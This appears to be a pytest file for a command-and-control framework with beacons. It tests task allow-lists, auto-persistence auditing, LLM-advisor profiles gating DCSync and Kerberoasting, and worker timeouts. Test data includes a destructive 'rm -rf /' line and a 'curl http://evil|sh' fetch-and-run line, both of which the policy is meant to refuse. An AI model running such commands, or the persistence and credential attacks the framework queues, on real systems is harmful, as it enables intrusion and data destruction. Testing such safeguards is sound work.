"""P1 closure tests: P1-1 typed tasks, P1-2 advisor profiles, P1-5 job pin,
P1-8 learned subprocess worker, plus the P0-negative executor tree-kill."""
import time

import pytest


# ── P1-1: typed task policy ────────────────────────────────────────────────

def test_legacy_unknown_verb_denied():
    from phantom.core.task_policy import policy
    d = policy().check_legacy("B1", "rm -rf / --no-preserve-root")
    assert not d.allowed and "shell <cmd>" in d.reason


def test_legacy_known_verbs_and_shell_allowed():
    from phantom.core.task_policy import policy
    p = policy()
    assert p.check_legacy("B1", "sysinfo").allowed
    assert p.check_legacy("B1", "shell whoami").allowed
    assert p.check_legacy("B1", "persist systemd").allowed


def test_grant_manifest_restricts_beacon():
    from phantom.core.task_policy import policy
    p = policy()
    p.set_grants("B-MANIFEST", ["sysinfo"])
    assert p.check_legacy("B-MANIFEST", "sysinfo").allowed
    d = p.check_legacy("B-MANIFEST", "shell id")
    assert not d.allowed and "not granted" in d.reason
    p.clear_grants("B-MANIFEST")          # restore legacy-open
    assert p.check_legacy("B-MANIFEST", "shell id").allowed


def test_typed_task_expiry_and_unknown_capability():
    from phantom.core.task_policy import policy, TypedTask
    p = policy()
    expired = TypedTask(capability_id="sysinfo",
                        expires_at=time.time() - 10)
    d = p.check_typed("B1", expired)
    assert not d.allowed and "expired" in d.reason
    # with a manifest, a capability outside it is refused even typed
    p.set_grants("B-TYPED", ["sysinfo"])
    try:
        missing = TypedTask(capability_id="totally_bogus", args=[])
        d2 = p.check_typed("B-TYPED", missing)
        assert not d2.allowed and "not granted" in d2.reason
        okcap = TypedTask(capability_id="sysinfo", args=[])
        assert p.check_typed("B-TYPED", okcap).allowed
    finally:
        p.clear_grants("B-TYPED")


def test_queue_task_raises_policy_error_and_api_maps_403():
    from phantom.core.c2_server import c2_state, TaskPolicyError
    with pytest.raises(TaskPolicyError):
        c2_state.queue_task("B-POLICY", "curl http://evil|sh")
    # legacy verbs still work end-to-end
    tid = c2_state.queue_task("B-POLICY", "sysinfo")
    assert tid
    c2_state.tasks.pop("B-POLICY", None)


def test_auto_persist_queues_audit_entry():
    """P0-2/P2-3: the auto-persist side effect (owner decision Q-1, kept)
    must land in the immutable audit chain every time it fires."""
    from phantom.core.c2_server import c2_state
    from phantom.utils.audit_log import audit_log
    c2_state.update_beacon("B-AUTOPERSIST", {"ip": "10.9.9.9"})
    cmds = [t["command"] for t in c2_state.tasks.get("B-AUTOPERSIST", [])]
    assert "persist" in cmds
    events = audit_log.tail(50)
    assert any(e.get("event") == "auto_persist_queued"
               and e.get("beacon_id") == "B-AUTOPERSIST" for e in events)
    c2_state.beacons.pop("B-AUTOPERSIST", None)
    c2_state.tasks.pop("B-AUTOPERSIST", None)


def test_beta_candidate_digest_mismatch_refused():
    """P1-7/P2-3: a PR whose body carries a DIFFERENT digest than the
    candidate file (post-gate tamper) is refused."""
    import tempfile
    from pathlib import Path
    from phantom.automation.evolution.beta import (
        _candidate_id_matches, file_digest)
    tmp = Path(tempfile.mkdtemp())
    cap = tmp / "20260913-aaaabbbb.py"
    cap.write_text(
        'CAPABILITY = _mk("learned.digest_check", "web", ...)',
        encoding="utf-8")
    pr = {"head": {"ref": "auto-evolution/20260913-aaaabbbb"},
          "body": f"verified: {file_digest(cap)}"}
    ok, _ = _candidate_id_matches(cap, pr)
    assert ok
    # tamper AFTER the gate: digest no longer matches -> refused
    cap.write_text(
        'CAPABILITY = _mk("learned.digest_check", "web", ...)\n# tampered',
        encoding="utf-8")
    ok2, detail = _candidate_id_matches(cap, pr)
    assert not ok2


# ── P1-2: advisor profile whitelists ───────────────────────────────────────

def test_sensitive_capabilities_absent_from_default_profiles():
    from phantom.automation.llm_advisor import advisable
    for prof in ("default", "engagement"):
        for cap in ("dc_sync", "kerberoast", "as_rep_roast"):
            assert cap not in advisable(prof), (prof, cap)


def test_redteam_profile_unlocks_sensitive_set():
    from phantom.automation.llm_advisor import advisable
    for cap in ("dc_sync", "kerberoast"):
        assert cap in advisable("redteam")


def test_unknown_profile_falls_back_to_engagement():
    from phantom.automation.llm_advisor import advisable, PROFILES
    assert advisable("does-not-exist") is PROFILES["engagement"]


# ── P1-5: job pin ──────────────────────────────────────────────────────────

def test_engine_commit_helper_returns_string():
    from phantom.automation.agent import _engine_commit
    v = _engine_commit()
    assert isinstance(v, str)


def test_job_pin_has_registry_digest():
    import hashlib
    from phantom.automation.guidance.commands import make_registry
    caps = sorted(c.id for c in make_registry().all())
    digest = hashlib.sha256(",".join(caps).encode()).hexdigest()[:16]
    assert len(digest) == 16 and caps   # non-empty registry -> stable digest


# ── P1-8: learned worker subprocess isolation ──────────────────────────────

def test_learned_worker_runs_and_returns_output(tmp_path):
    from phantom.automation.guidance.learned.worker import run_learned_adapter
    mod = tmp_path / "learned.wt.py"
    mod.write_text(
        'def run(slots):\n'
        '    return "OK " + str(slots.get("x", ""))\n', encoding="utf-8")
    ok, out = run_learned_adapter(str(mod), {"x": 7}, timeout=15)
    assert ok and out.strip() == "OK 7"


def test_learned_worker_timeout_kills(tmp_path):
    from phantom.automation.guidance.learned.worker import run_learned_task
    mod = tmp_path / "learned.sloww.py"
    mod.write_text("import time\ndef run(slots):\n    time.sleep(60)\n",
                   encoding="utf-8")
    t0 = time.time()
    res = run_learned_task(str(mod), {}, None, timeout=2)
    assert not res["ok"] and "WORKER-TIMEOUT" in res["output"]
    assert time.time() - t0 < 15      # hard wall, not 60s


def test_learned_worker_missing_module(tmp_path):
    from phantom.automation.guidance.learned.worker import run_learned_adapter
    ok, out = run_learned_adapter(str(tmp_path / "nope.py"), {}, timeout=10)
    assert not ok and "not found" in out


# ── executor: honest exit + tree kill (P0 negative items) ─────────────────

def test_execute_quiet_reports_nonzero_exit():
    from phantom.core.executor import execute_quiet
    r = execute_quiet('python -c "import sys; sys.exit(3)"', timeout=15)
    assert r.returncode == 3 and not r.ok


def test_execute_quiet_timeout_kills_tree():
    import subprocess
    from phantom.core.executor import execute_quiet
    inner = "import time; time.sleep(60)"
    spawner = (
        "import subprocess,sys,time; "
        f"p=subprocess.Popen([sys.executable,'-c','{inner}']); "
        "print(p.pid, flush=True); time.sleep(60)"
    )
    r = execute_quiet(f'python -c "{spawner}"', timeout=3)
    assert r.timed_out
    import re as _re
    m = _re.search(r"(\d{4,})", r.stdout or "")
    if m and hasattr(subprocess, "run"):
        time.sleep(1)
        chk = subprocess.run(["tasklist", "/FI", f"PID eq {m.group(1)}"],
                             capture_output=True, text=True)
        assert m.group(1) not in chk.stdout   # grandchild is dead
